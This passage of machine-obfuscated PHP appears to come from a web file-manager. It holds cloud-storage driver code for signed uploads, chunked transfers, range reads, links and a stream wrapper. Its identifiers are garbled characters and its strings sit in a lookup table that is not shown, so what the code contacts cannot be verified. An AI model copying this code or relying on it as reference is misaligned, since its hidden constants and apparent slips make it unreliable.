(!$Âš¨²À©) { return !1; } $¬†Öã®° = isset($Âš¨²À©[$îÑÄˆ©à[1637]]) ? $Âš¨²À©[$îÑÄˆ©à[1637]] : $îÑÄˆ©à[12]; $ÜÚ©²ó¿ = isset($Âš¨²À©[$îÑÄˆ©à[1638]]) ? $Âš¨²À©[$îÑÄˆ©à[1638]] : array(); if (empty($ÜÚ©²ó¿)) { break; } $íÙŒáÒÎ = array_filter($ÜÚ©²ó¿, function ($—Ÿ×£Å ) { $ˆŞÇ¬‘Õ =& $_SERVER[¬ÏÕ§Áú]; return $—Ÿ×£Å [$ˆŞÇ¬‘Õ[33]] == $ˆŞÇ¬‘Õ[88]; }); $·ùïï™ = count($ÜÚ©²ó¿); $íÙŒáÒÎ = count($íÙŒáÒÎ); $æİ±Ç–Œ = $·ùïï™ - $íÙŒáÒÎ; if ($¥ÏÕèôÃ) { $—¥Øô§ñ += $íÙŒáÒÎ; $óƒó¸¬© += $æİ±Ç–Œ; if ($·ùïï™ < $¦ÏÑàø•) { break; } continue; } if ($¢î‰÷¢ş) { if ($æİ±Ç–Œ) { return !0; } } else { if ($íÙŒáÒÎ) { return !0; } } if ($·ùïï™ < $¦ÏÑàø•) { break; } } if ($¥ÏÕèôÃ) { return array($îÑÄˆ©à[252] => $óƒó¸¬©, $îÑÄˆ©à[253] => $—¥Øô§ñ); } return !1; } public function listAll($•â°®ƒ¢) { $öË–Ú•„ =& $_SERVER[¬ÏÕ§Áú]; $ÎâÉô¥ = $Ñêè‚ìš = array(); $this->fileList($•â°®ƒ¢, $ÎâÉô¥, $Ñêè‚ìš, !0); $éîĞü½ = array_to_keyvalue($Ñêè‚ìš, $öË–Ú•„[32]); foreach ($ÎâÉô¥ as $âšòˆŒã) { if (is_string($âšòˆŒã)) { $éîĞü½[$âšòˆŒã] = array($öË–Ú•„[89] => 0); } } return $this->listAllFiles($•â°®ƒ¢, $éîĞü½); } public function canRead($ÈÔä¢ÇÖ) { return $this->exist($ÈÔä¢ÇÖ) ? !0 : !1; } public function canWrite($Û¢ÙÛ³ò) { return $this->exist($Û¢ÙÛ³ò) ? !0 : !1; } public function getContent($ğ”Áì¡) { return $this->fileSubstr($ğ”Áì¡, 0, -1); } public function setContent($ÍÇ›ôÎ, $­ÖÎ…ôá = '') { $Ê¸î¤Á” =& $_SERVER[¬ÏÕ§Áú]; if (!$­ÖÎ…ôá) { $æÌ¢á‡® = $this->ussRequest($ÍÇ›ôÎ, $Ê¸î¤Á”[300]); return $æÌ¢á‡®[$Ê¸î¤Á”[1352]]; } $˜“ñïüª = $this->tempFile($this->pathThis($ÍÇ›ôÎ)); file_put_contents($˜“ñïüª, $­ÖÎ…ôá); if ($this->upload($ÍÇ›ôÎ, $˜“ñïüª)) { $this->tempFileRemve($˜“ñïüª); return !0; } return !1; } public function fileSubstr($ğ¢‘ÈÒ, $€àÒ£À, $û™‹Ê‡Æ) { $Ö¤—ñ°¸ =& $_SERVER[¬ÏÕ§Áú]; if (!($Åì³¢— = $this->link($ğ¢‘ÈÒ))) { return !1; } $»Ÿ¡šïü = !1; if ($û™‹Ê‡Æ > 0) { $Ÿí‰‰ƒÖ = $€àÒ£À + $û™‹Ê‡Æ - 1; $»Ÿ¡šïü = array($Ö¤—ñ°¸[1597] . $€àÒ£À . $Ö¤—ñ°¸[482] . $Ÿí‰‰ƒÖ); } $ÅÕåßÊ« = url_request($Åì³¢—, $Ö¤—ñ°¸[1558], !1, $»Ÿ¡šïü); return $ÅÕåßÊ«[$Ö¤—ñ°¸[863]] ? $ÅÕåßÊ«[$Ö¤—ñ°¸[1342]] : !1; } public function upload($¡ƒÉÒë±, $á±©â¶‹, $ÉíòÁĞÓ = false, $¡¹¸Î†¡ = REPEAT_REPLACE) { $±å³ğğ =& $_SERVER[¬ÏÕ§Áú]; $ÏÙÕÄ = IO::size($á±©â¶‹); if ($ÏÙÕÄ <= 1024 * 1024 * 200) { $ªçéĞ‰¬ = array($±å³ğğ[1640] . $á±©â¶‹); $ÒÙöğ´ = $this->ussRequest($¡ƒÉÒë±, $±å³ğğ[266], $ªçéĞ‰¬); return $ÒÙöğ´[$±å³ğğ[1352]] ? $this->getPathOuter($¡ƒÉÒë±) : !1; } $‰ÑÃ–×­ = 1024 * 1024 * 10; $õ±ØÂ‰ó = array($±å³ğğ[1641], $±å³ğğ[1642] . $ÏÙÕÄ, $±å³ğğ[1643], $±å³ğğ[1644] . $‰ÑÃ–×­); $ÒÙöğ´ = $this->ussRequest($¡ƒÉÒë±, $±å³ğğ[266], !1, $õ±ØÂ‰ó); if (!$ÒÙöğ´[$±å³ğğ[1352]]) { return !1; } $›ÃÔñâª = $ÒÙöğ´[$±å³ğğ[1342]]; $ê×Ğıªù = 0; $å÷ú¿Ù¾ = $›ÃÔñâª[$±å³ğğ[1645]]; $ş™µò = fopen($á±©â¶‹, $±å³ğğ[1521]); if (!$ş™µò) { return !1; } do { $äº—§âü = $›ÃÔñâª[$±å³ğğ[1646]]; fseek_64($ş™µò, $ê×Ğıªù); $ª»¥×Ïä = fread($ş™µò, $äº—§âü); $÷æĞ¾üœ = 0; do { $÷æĞ¾üœ++; $›ÃÔñâª = $this->uploadPart($¡ƒÉÒë±, $›ÃÔñâª, $ª»¥×Ïä); } while (!$›ÃÔñâª && $÷æĞ¾üœ < 3); if (!$›ÃÔñâª) { return !1; } $å÷ú¿Ù¾ = $›ÃÔñâª[$±å³ğğ[1645]]; $ê×Ğıªù += $äº—§âü; } while ($å÷ú¿Ù¾ != -1); fclose($ş™µò); $õ±ØÂ‰ó = array($±å³ğğ[1647], $±å³ğğ[1648] . $›ÃÔñâª[$±å³ğğ[1649]], $±å³ğğ[1643]); $ÒÙöğ´ = $this->ussRequest($¡ƒÉÒë±, $±å³ğğ[266], !1, $õ±ØÂ‰ó); return $ÒÙöğ´[$±å³ğğ[1352]] ? $this->getPathOuter($…‘’—ıâ) : !1; } private function uploadPart($éóåñüë, $ø«Õçó˜, &$åŸÀÍû») { $ğ±µı“ë =& $_SERVER[¬ÏÕ§Áú]; $«¤ÑéÈº = array($ğ±µı“ë[1650], $ğ±µı“ë[1648] . $ø«Õçó˜[$ğ±µı“ë[1649]], $ğ±µı“ë[1651] . $ø«Õçó˜[$ğ±µı“ë[1645]], $ğ±µı“ë[156] . $ø«Õçó˜[$ğ±µı“ë[1646]]); $ˆÏ¤¿Œ– = $this->ussRequest($éóåñüë, $ğ±µı“ë[266], $åŸÀÍû», $«¤ÑéÈº); return !$ˆÏ¤¿Œ–[$ğ±µı“ë[1352]] ? $ˆÏ¤¿Œ–[$ğ±µı“ë[1352]] : $ˆÏ¤¿Œ–[$ğ±µı“ë[1342]]; } public function uploadFormData($«„î‚Òû, $Ô”‘Ü° = 3600) { return $this->uploadPolicy($«„î‚Òû, $Ô”‘Ü°); } public function uploadMultiData($ä’ÜàÉÍ, $¯ïñíş„ = 3600) { $‘ÉÒ’Ëû =& $_SERVER[¬ÏÕ§Áú]; $ñëŸœ¸é = (int) $GLOBALS[$‘ÉÒ’Ëû[7]][$‘ÉÒ’Ëû[89]]; return $this->uploadPolicy($ä’ÜàÉÍ, $¯ïñíş„, $ñëŸœ¸é); } private function uploadPolicy($ÒÊÜ«‡ä, $®êÇŞ÷ = 3600, $×™ö¤Ø = 0) { $êĞ“Õšü =& $_SERVER[¬ÏÕ§Áú]; $³Ú•²Ó» = $êĞ“Õšü[8] . $this->bucket; $¨·åã‚© = gmdate($êĞ“Õšü[1556]); $Ä« ×ë = array($êĞ“Õšü[1652] => $this->bucket, $êĞ“Õšü[1653] => $ÒÊÜ«‡ä, $êĞ“Õšü[1654] => time() + $®êÇŞ÷, $êĞ“Õšü[1655] => $¨·åã‚©); if ($×™ö¤Ø) { $Ä« ×ë[$êĞ“Õšü[1541]] = $×™ö¤Ø; } $©²Ìß§Ç = base64_encode(json_encode($Ä« ×ë)); $ì‡Ö¾ = base64_encode(hash_hmac($êĞ“Õšü[1609], "\120\117\x53\124\x26{$³Ú•²Ó»}\x26{$¨·åã‚©}\x26{$©²Ìß§Ç}", md5("{$this->userpass}"), !0)); $ğƒÔãÃ¾ = array($êĞ“Õšü[290] => $©²Ìß§Ç, $êĞ“Õšü[1656] => "\125\120\x59\x55\116\x20{$this->username}\72{$ì‡Ö¾}", $êĞ“Õšü[219] => $this->endpoint . $³Ú•²Ó»); return $ğƒÔãÃ¾; } public function download($£‰òÚîƒ, $æ½Ù‰ˆ) { $Ìõ€şê = IO::getPathInner(IO::mkfile($æ½Ù‰ˆ)); if (!($»õ‚‰ıÕ = $this->link($£‰òÚîƒ))) { return !1; } $æİ£ñĞÈ = 0; $ÚÕßõÅ¼ = 1024 * 200; $áÁ¡ù…¶ = fopen($Ìõ€şê, $_SERVER[¬ÏÕ§Áú][1603]); while (!0) { $é¤ÙñÆÁ = $this->fileSubstr($£‰òÚîƒ, $æİ£ñĞÈ, $ÚÕßõÅ¼); if ($é¤ÙñÆÁ === !1) { return !1; } fwrite($áÁ¡ù…¶, $é¤ÙñÆÁ); $æİ£ñĞÈ += $ÚÕßõÅ¼; if (strlen($é¤ÙñÆÁ) < $ÚÕßõÅ¼) { break; } } fclose($áÁ¡ù…¶); return $æ½Ù‰ˆ; } public function link($“‹Â÷Ó¾, $çÆŸ˜’— = array()) { $€­ôÍ•í =& $_SERVER[¬ÏÕ§Áú]; $“‹Â÷Ó¾ = trim($“‹Â÷Ó¾, $€­ôÍ•í[8]); if (!empty($this->token)) { $«š‚Èò = strtotime(date($€­ôÍ•í[1657])); $Äëş×ÕÜ = substr(md5($this->token . $€­ôÍ•í[297] . $«š‚Èò . $€­ôÍ•í[1658] . $“‹Â÷Ó¾), 12, 8) . $«š‚Èò; $çÆŸ˜’—[] = $€­ôÍ•í[1659] . $Äëş×ÕÜ; } $÷†¾ïĞ‹ = !empty($çÆŸ˜’—) ? $€­ôÍ•í[86] . implode($€­ôÍ•í[297], $çÆŸ˜’—) : $€­ôÍ•í[12]; return $this->getHost() . $€­ôÍ•í[8] . $this->pathEncode($“‹Â÷Ó¾) . $÷†¾ïĞ‹; } public function fileOut($ï¥Óõ²Í, $ğ„™Ä¿Ğ = false, $¢ª¼ßİÙ = false, $‘ıéøÛ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ï¥Óõ²Í, $ğ„™Ä¿Ğ, $¢ª¼ßİÙ, $‘ıéøÛ); } if (!$¢ª¼ßİÙ) { $¢ª¼ßİÙ = $this->pathThis($ï¥Óõ²Í); } $ò›Ã§’å = $ğ„™Ä¿Ğ ? array($_SERVER[¬ÏÕ§Áú][1660] . rawurlencode($¢ª¼ßİÙ)) : array(); $íÔğö¨ = $this->link($ï¥Óõ²Í, $ò›Ã§’å); $this->fileOutLink($íÔğö¨); } public function fileOutServer($šËÇ¶ç×, $ù¯ìÊ»‚ = false, $ƒˆ¢…²™ = false, $àÇ‘¶úò = '') { parent::fileOut($šËÇ¶ç×, $ù¯ìÊ»‚, $ƒˆ¢…²™, $àÇ‘¶úò); } public function fileOutImage($üâºë³Ê, $åÆØÛ™· = 250) { $¾ôú©£¤ = $this->link($üâºë³Ê . $_SERVER[¬ÏÕ§Áú][1661] . $åÆØÛ™·); $this->fileOutLink($¾ôú©£¤); } public function fileOutImageServer($Ú£Æ‘×ø, $Ùƒ²ÄÃ = 250) { parent::fileOutImage($Ú£Æ‘×ø, $Ùƒ²ÄÃ); } public function hashMd5($Óï×ÊÁ¦) { $²ü¦ëò¤ =& $_SERVER[¬ÏÕ§Áú]; $üªö°™ï = $this->_objectMeta($Óï×ÊÁ¦); return isset($üªö°™ï[$²ü¦ëò¤[258]]) ? $üªö°™ï[$²ü¦ëò¤[258]] : !1; } public function size($ÜóŠ§îœ) { $Ì’ñ–¥ = $this->objectMeta($ÜóŠ§îœ); return $Ì’ñ–¥ ? $Ì’ñ–¥[$_SERVER[¬ÏÕ§Áú][89]] : 0; } public function info($÷¤ãÏº) { if ($this->isFolder($÷¤ãÏº)) { return $this->folderInfo($÷¤ãÏº); } else { if ($this->isFile($÷¤ãÏº)) { return $this->fileInfo($÷¤ãÏº); } } return !1; } public function exist($»–œœÍí) { return $this->isFile($»–œœÍí) || $this->isFolder($»–œœÍí); } public function isFile($¦¹Œ„Í) { return !$this->isFolder($¦¹Œ„Í) && $this->objectMeta($¦¹Œ„Í); } public function isFolder($Ü••Í¿) { return $this->cacheMethod($_SERVER[¬ÏÕ§Áú][190], $Ü••Í¿); } protected function objectMeta($ƒ¼Â‡É’) { return $this->cacheMethod($_SERVER[¬ÏÕ§Áú][192], $ƒ¼Â‡É’); } protected function _objectMeta($î—¹¾±) { $Û‘©ğ˜ =& $_SERVER[¬ÏÕ§Áú]; if ($î—¹¾± == $Û‘©ğ˜[12] || $î—¹¾± == $Û‘©ğ˜[8]) { return array(); } $‘Ó¦Û—† = $this->ussRequest($î—¹¾±, $Û‘©ğ˜[1662]); if (!$‘Ó¦Û—†[$Û‘©ğ˜[1352]]) { return null; } $¢±†¯ë• = isset($‘Ó¦Û—†[$Û‘©ğ˜[1342]]) ? $‘Ó¦Û—†[$Û‘©ğ˜[1342]] : array(); if (!isset($¢±†¯ë•[$Û‘©ğ˜[1663]])) { return null; } $Ç˜§¾Ò“ = array($Û‘©ğ˜[33] => isset($¢±†¯ë•[$Û‘©ğ˜[1663]]) ? $¢±†¯ë•[$Û‘©ğ˜[1663]] : null, $Û‘©ğ˜[89] => isset($¢±†¯ë•[$Û‘©ğ˜[1664]]) ? $¢±†¯ë•[$Û‘©ğ˜[1664]] : null, $Û‘©ğ˜[258] => isset($¢±†¯ë•[$Û‘©ğ˜[1665]]) ? $¢±†¯ë•[$Û‘©ğ˜[1665]] : null, $Û‘©ğ˜[1632] => isset($¢±†¯ë•[$Û‘©ğ˜[1666]]) ? $¢±†¯ë•[$Û‘©ğ˜[1666]] : null); $Ç˜§¾Ò“[$Û‘©ğ˜[1633]] = isset($¢±†¯ë•[$Û‘©ğ˜[1667]]) ? strtotime($¢±†¯ë•[$Û‘©ğ˜[1667]]) : $Ç˜§¾Ò“[$Û‘©ğ˜[1632]]; return $Ç˜§¾Ò“; } protected function _isFolder($ÖÅĞÄŞÔ) { $ßî¥ÃìÒ =& $_SERVER[¬ÏÕ§Áú]; if ($ÖÅĞÄŞÔ == $ßî¥ÃìÒ[12] || $ÖÅĞÄŞÔ == $ßî¥ÃìÒ[8]) { return !0; } $æ¦Î¼¨§ = $this->_objectMeta($ÖÅĞÄŞÔ); return isset($æ¦Î¼¨§[$ßî¥ÃìÒ[33]]) && $æ¦Î¼¨§[$ßî¥ÃìÒ[33]] == $ßî¥ÃìÒ[88] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($¿Î°…ş¡ = false) { } public function exist($ÆãêÉşÀ) { $ÌƒæúŸ = $this->info($ÆãêÉşÀ); return $ÌƒæúŸ[$_SERVER[¬ÏÕ§Áú][245]]; } public function isFile($Ã„È‰ÁÛ) { $æ‘¬íëÃ = $this->info($Ã„È‰ÁÛ); return $æ‘¬íëÃ[$_SERVER[¬ÏÕ§Áú][245]]; } public function isFolder($º¼˜¥Ï) { return !1; } public function size($ë»Ğ»Ûä) { $È«¢îÌ = $this->info($ë»Ğ»Ûä); return $È«¢îÌ[$_SERVER[¬ÏÕ§Áú][89]]; } public function info($ğ¥Æ¼û) { return $this->infoParse($ğ¥Æ¼û); } public function infoAuth($ôæØéªé) { return $this->infoParse($ôæØéªé); } public function infoWithChildren($—…”ë®š) { return $this->infoParse($—…”ë®š); } public function infoFull($ÒÃ˜Å×Ñ) { return $this->infoParse($ÒÃ˜Å×Ñ); } private function infoParse($´§ò­³‡) { $ Š½Ñó¢ =& $_SERVER[¬ÏÕ§Áú]; $“İ¤¶–ƒ = $this->header($´§ò­³‡); if (!$“İ¤¶–ƒ || !$“İ¤¶–ƒ[$ Š½Ñó¢[863]]) { return !1; } $Ò¥à­êŠ = _get($“İ¤¶–ƒ, $ Š½Ñó¢[423], 0); $¤éÕ«È‚ = array($ Š½Ñó¢[32] => $“İ¤¶–ƒ[$ Š½Ñó¢[32]], $ Š½Ñó¢[97] => $´§ò­³‡, $ Š½Ñó¢[33] => $ Š½Ñó¢[243], $ Š½Ñó¢[89] => intval($Ò¥à­êŠ), $ Š½Ñó¢[179] => get_path_ext($“İ¤¶–ƒ[$ Š½Ñó¢[32]]), $ Š½Ñó¢[1518] => $Ò¥à­êŠ > 0 && $“İ¤¶–ƒ[$ Š½Ñó¢[1668]], $ Š½Ñó¢[1519] => !1); return $¤éÕ«È‚; } private function header($ÈœÌÑÖö) { $åÆÆ‘şí =& $_SERVER[¬ÏÕ§Áú]; if (isset(self::$_cacheHeader[$ÈœÌÑÖö])) { return self::$_cacheHeader[$ÈœÌÑÖö]; } $ó—áËĞÚ = isset($GLOBALS[$åÆÆ‘şí[1669]]) ? $GLOBALS[$åÆÆ‘şí[1669]] : !1; $GLOBALS[$åÆÆ‘şí[1669]] = !0; self::$_cacheHeader[$ÈœÌÑÖö] = url_header($ÈœÌÑÖö); $GLOBALS[$åÆÆ‘şí[1669]] = $ó—áËĞÚ; return self::$_cacheHeader[$ÈœÌÑÖö]; } public function hashSimple($úº…Ùš¹, $ÅÄ™Ôê¥ = false) { $üØ–Š¿ñ =& $_SERVER[¬ÏÕ§Áú]; $²Ú®ÔÔî = $this->info($úº…Ùš¹); if (!$²Ú®ÔÔî || !$²Ú®ÔÔî[$üØ–Š¿ñ[245]]) { return !1; } $å®ŠÆÀ¢ = $²Ú®ÔÔî[$üØ–Š¿ñ[89]]; $Ş¹Ø˜åõ = 200; $šªü…æ = 50; if ($å®ŠÆÀ¢ <= $Ş¹Ø˜åõ * $šªü…æ) { return md5($this->fileSubstr($úº…Ùš¹, 0, $å®ŠÆÀ¢)) . $å®ŠÆÀ¢; } $·õÎ¢ï = intval($å®ŠÆÀ¢ / $šªü…æ); $‡‚’ÜĞ = $üØ–Š¿ñ[12]; $µÃÍ“Ã÷ = timeFloat(); $ò¨ÚÒ¢õ = 15; for ($”¢”Ú”á = 0; $”¢”Ú”á < $šªü…æ; $”¢”Ú”á++) { if (timeFloat() - $µÃÍ“Ã÷ > $ò¨ÚÒ¢õ) { return !1; } $ÂØó°İ¯ = $this->fileSubstr($úº…Ùš¹, $·õÎ¢ï * $”¢”Ú”á, $Ş¹Ø˜åõ); if (!$ÂØó°İ¯) { return !1; } $‡‚’ÜĞ .= $ÂØó°İ¯; } $‡‚’ÜĞ .= $this->fileSubstr($úº…Ùš¹, $å®ŠÆÀ¢ - $Ş¹Ø˜åõ, $Ş¹Ø˜åõ); return md5($‡‚’ÜĞ) . $å®ŠÆÀ¢; } public function getContent($ĞıÛõÀô) { return $this->fileSubstr($ĞıÛõÀô); } public function fileSubstr($é¨•º¾, $†ÍÜ¢Áˆ = 0, $ÑœÔÃî = -1) { $£Ã«Å¨Ê =& $_SERVER[¬ÏÕ§Áú]; $¸°Ÿ‚íí = $this->info($é¨•º¾); if (!$¸°Ÿ‚íí || !$¸°Ÿ‚íí[$£Ã«Å¨Ê[245]] && $¸°Ÿ‚íí[$£Ã«Å¨Ê[89]] > 1024 * 1024 * 10) { return !1; } if ($ÑœÔÃî === -1) { $ÑœÔÃî = $¸°Ÿ‚íí[$£Ã«Å¨Ê[89]]; } if ($ÑœÔÃî == 0) { return $£Ã«Å¨Ê[12]; } $¨Çıô¼ = array($£Ã«Å¨Ê[1670] . $†ÍÜ¢Áˆ . $£Ã«Å¨Ê[903] . ($†ÍÜ¢Áˆ + $ÑœÔÃî - 1)); $í¸à—ö = url_request($é¨•º¾, $£Ã«Å¨Ê[1558], !1, $¨Çıô¼, !1, !1, 30); return $í¸à—ö[$£Ã«Å¨Ê[1342]] ? $í¸à—ö[$£Ã«Å¨Ê[1342]] : $£Ã«Å¨Ê[12]; } public function download($ÆÙ¦©È, $ÅÙ“†ï‚) { Downloader::start($ÆÙ¦©È, $ÅÙ“†ï‚); return $ÅÙ“†ï‚; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Õ´ÊË «, $èàè¥¤¦ = '') { $this->info = $this->info($Õ´ÊË «); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¬ÏÕ§Áú][97]]; $this->pathOpen = $Õ´ÊË «; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Õ´ÊË «])) { self::$_chunkBuffer[$Õ´ÊË «] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ñÆĞ¿‰´) { $ğüÂµÚ˜ = $this->fileSubstr($this->pose, $ñÆĞ¿‰´); $this->pose += strlen($ğüÂµÚ˜); return $ğüÂµÚ˜; } public function stream_tell() { return $this->pose; } public function stream_seek($¦ÄïÛ‡ğ, $¦­¯ Ÿ) { $äÂÂÍœ— =& $_SERVER[¬ÏÕ§Áú]; if ($¦­¯ Ÿ == SEEK_SET) { $this->pose = $¦ÄïÛ‡ğ; } else { if ($¦­¯ Ÿ == SEEK_CUR) { $this->pose += $¦ÄïÛ‡ğ; } else { if ($¦­¯ Ÿ == SEEK_END) { $this->pose = $this->info[$äÂÂÍœ—[89]] + intval($¦ÄïÛ‡ğ); } } } if ($¦ÄïÛ‡ğ < 0) { $this->pose = $this->info[$äÂÂÍœ—[89]] + $¦ÄïÛ‡ğ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¬ÏÕ§Áú][89]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($•†¤ó¿ù, $¹óœŒ) { $ÓœğòØª =& $_SERVER[¬ÏÕ§Áú]; $ñ÷ŠÙß‡ = $this->info($•†¤ó¿ù); return array($ÓœğòØª[1462] => 0, $ÓœğòØª[1671] => 0, $ÓœğòØª[16] => 32768 + 511, $ÓœğòØª[1672] => 0, $ÓœğòØª[1673] => 0, $ÓœğòØª[1674] => 0, $ÓœğòØª[1675] => 0, $ÓœğòØª[89] => $ñ÷ŠÙß‡[$ÓœğòØª[89]], $ÓœğòØª[1676] => $ñ÷ŠÙß‡[$ÓœğòØª[1517]], $ÓœğòØª[1633] => $ñ÷ŠÙß‡[$ÓœğòØª[98]], $ÓœğòØª[1632] => $ñ÷ŠÙß‡[$ÓœğòØª[244]], $ÓœğòØª[1677] => 0, $ÓœğòØª[1678] => 0); } static $fileInfo = array(); public function info($•’Ùß›¢) { $¿­º™â® = $_SERVER[¬ÏÕ§Áú][1679]; if (isset(self::$fileInfo[$•’Ùß›¢])) { return self::$fileInfo[$•’Ùß›¢]; } if (substr($•’Ùß›¢, 0, strlen($¿­º™â®)) != $¿­º™â®) { return !1; } self::$fileInfo[$•’Ùß›¢] = IO::info(substr($•’Ùß›¢, strlen($¿­º™â®))); return self::$fileInfo[$•’Ùß›¢]; } public static function read($à¨•òµ, $òÊÄƒøÛ, $Í¦­ÁŠÊ) { if (!isset(self::$_fopenCache[$à¨•òµ])) { $åòñˆãæ = new StreamWrapperIO(); $åòñˆãæ->stream_open($à¨•òµ); self::$_fopenCache[$à¨•òµ] = $åòñˆãæ; } $åòñˆãæ = self::$_fopenCache[$à¨•òµ]; return $åòñˆãæ->fileSubstr($òÊÄƒøÛ, $Í¦­ÁŠÊ); } public static function _read($²ŠÖÄ„‹, $¼ÀÎ†Ş¯, $ú¸«ç„ş) { $ø…áÜ¦ =& $_SERVER[¬ÏÕ§Áú]; $™ÚÎòÕ = fopen($²ŠÖÄ„‹, $ø…áÜ¦[1521]); if (!$™ÚÎòÕ) { return $ø…áÜ¦[12]; } $´Í—ÑŞ = 8192; fseek($™ÚÎòÕ, $¼ÀÎ†Ş¯, SEEK_SET); $íºŠşŸ° = $ø…áÜ¦[12]; $Òèê“ñó = 0; while ($Òèê“ñó < $ú¸«ç„ş) { $—ˆÖèù¿ = min($´Í—ÑŞ, $ú¸«ç„ş - $Òèê“ñó); $íºŠşŸ° .= fread($™ÚÎòÕ, $—ˆÖèù¿); $Òèê“ñó += $—ˆÖèù¿; } fclose($™ÚÎòÕ); return $íºŠşŸ°; } public function fileSubstr($âÊ² –, $Ş„ÀâÂİ) { $àĞşÏÜ =& $_SERVER[¬ÏÕ§Áú]; $Î–Ÿ¢ô× = $this->info[$àĞşÏÜ[89]]; $·÷¨ùï¨ = $âÊ² –; $¹…Ä¾–ê = $Ş„ÀâÂİ; if ($âÊ² – < 0) { $âÊ² – = $Î–Ÿ¢ô× + $âÊ² –; } if ($Ş„ÀâÂİ === !1) { $Ş„ÀâÂİ = $Î–Ÿ¢ô× - $âÊ² –; } if ($âÊ² – + $Ş„ÀâÂİ > $Î–Ÿ¢ô×) { $Ş„ÀâÂİ = $Î–Ÿ¢ô× - $âÊ² –; } if ($Ş„ÀâÂİ <= 0) { return $àĞşÏÜ[12]; } if ($âÊ² – < 0 || $âÊ² – >= $Î–Ÿ¢ô× || $Ş„ÀâÂİ <= 0 || $Ş„ÀâÂİ > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\151\154\x65\x52\x65\x61\144\40\x65\x72\162\157\162\x21\x20\163\x74\141\x72\164\75{$âÊ² –}\73\154\x65\x6e\147\164\x68\x3d{$Ş„ÀâÂİ}\73\40\163\151\x7a\x65\75{$Î–Ÿ¢ô×}\73"); } $‰àÏ€ï˜ = 64 * 1024; $ÛëÀ¯Æ =& self::$_chunkBuffer[$this->path]; if (!$ÛëÀ¯Æ) { $ÛëÀ¯Æ = array(); } $ŒùÀìÙ = 0; $¥ËœÜÑ‹ = 0; $¸ß­£ˆê = $àĞşÏÜ[12]; foreach ($ÛëÀ¯Æ as $ŒùÀìÙ => $¸ß­£ˆê) { $ŒùÀìÙ = intval($ŒùÀìÙ); $¥ËœÜÑ‹ = $ŒùÀìÙ + strlen($¸ß­£ˆê); if ($âÊ² – >= $¥ËœÜÑ‹) { continue; } if ($âÊ² – >= $ŒùÀìÙ && $âÊ² – + $Ş„ÀâÂİ <= $¥ËœÜÑ‹) { return substr($¸ß­£ˆê, $âÊ² – - $ŒùÀìÙ, $Ş„ÀâÂİ); } break; } if (count($ÛëÀ¯Æ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($àĞşÏÜ[1680], $àĞşÏÜ[1681] . count($ÛëÀ¯Æ) . "\73\x73\x74\141\162\x74\75{$âÊ² –}\54\154\x65\x6e\147\x74\x68\75{$Ş„ÀâÂİ}\73\x70\157\163\x65\x3a{$ŒùÀìÙ}\x7e{$¥ËœÜÑ‹}"); throw new Exception($àĞşÏÜ[1682]); } $ØÅûôª = intval($âÊ² – / $‰àÏ€ï˜) * $‰àÏ€ï˜; $¯“û–İ = ceil(($âÊ² – + $Ş„ÀâÂİ) / $‰àÏ€ï˜) * $‰àÏ€ï˜ - $ØÅûôª; $¬ÛÆ»İ› = IO::fileSubstr($this->path, $ØÅûôª, $¯“û–İ); $ÛëÀ¯Æ[$ØÅûôª . $àĞşÏÜ[12]] = $¬ÛÆ»İ›; ksort($ÛëÀ¯Æ); $ŒõØ¨ç² = substr($¬ÛÆ»İ›, $âÊ² – - $ØÅûôª, $Ş„ÀâÂİ); return $ŒõØ¨ç²; } private function log($÷‚šÖöÑ, $’¸ñ—ûÒ) { $îäµÕº =& $_SERVER[¬ÏÕ§Áú]; $³û”Ò÷û = timeFloat() - $this->timeStart; write_log(sprintf($îäµÕº[1683], $÷‚šÖöÑ, $this->info[$îäµÕº[32]], $³û”Ò÷û, $’¸ñ—ûÒ), $îäµÕº[1319]); } } goto D••åÊ’å¡; C„è¿£„‡Å: class KodIO { const KOD_SOURCE = "\173\x73\157\x75\x72\x63\145\x7d"; const KOD_USER_RECYCLE = "\173\165\x73\145\x72\122\145\x63\171\x63\x6c\145\x7d"; const KOD_USER_FAV = "\173\x75\163\145\162\106\141\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\162\106\151\154\145\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\162\x46\151\x6c\x65\124\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\x75\160\122\157\x6f\x74\x53\145\x6c\146\175"; const KOD_USER_SHARE = "\x7b\x75\x73\145\162\x53\150\141\162\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\x72\123\x68\141\x72\145\114\x69\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\x72\145\x54\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\173\163\150\x61\162\145\111\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\x61\x72\x65\111\x74\145\155\x4c\x69\156\153\175"; const KOD_SEARCH = "\x7b\x73\x65\141\162\143\x68\x7d"; const KOD_BLOCK = "\x7b\142\154\x6f\143\x6b\x7d"; const KOD_IO = "\x7b\151\157\x7d"; const KOD_USER_RECENT = "\173\165\163\x65\x72\122\x65\x6e\143\x65\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\x72\151\166\x65\162\175"; public static function typeList() { $ì¡úò¿Ì =& $_SERVER[¬ÏÕ§Áú]; return array($ì¡úò¿Ì[1391] => self::KOD_SOURCE, $ì¡úò¿Ì[1392] => self::KOD_USER_RECYCLE, $ì¡úò¿Ì[1393] => self::KOD_USER_FAV, $ì¡úò¿Ì[1394] => self::KOD_USER_FILE_TAG, $ì¡úò¿Ì[1395] => self::KOD_USER_FILE_TYPE, $ì¡úò¿Ì[1396] => self::KOD_GROUP_ROOT_SELF, $ì¡úò¿Ì[1397] => self::KOD_USER_SHARE, 